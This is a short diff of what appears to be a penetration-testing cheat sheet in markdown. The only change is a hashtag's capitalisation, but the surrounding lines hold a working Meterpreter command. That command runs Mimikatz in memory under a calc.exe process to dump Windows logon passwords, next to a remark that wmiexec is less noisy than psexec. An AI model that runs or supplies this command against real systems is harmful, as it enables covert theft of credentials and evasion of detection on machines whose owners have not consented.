@@ -20,7 +20,7 @@ wmiexec is less noisy than psexec
 ```
 
 
-### Mimikatz in RAM #mimkatz #reverseshell
+### Mimikatz in RAM #Mimikatz #reverseshell
 
 `# From MSF (execute Mimikatz in RAM) execute -H -i -c -m -d calc.exe -f /path/to/mimikatz.exe -a  '"privilege::debug" "sekurlsa::logonPasswords full" exit'` 
 
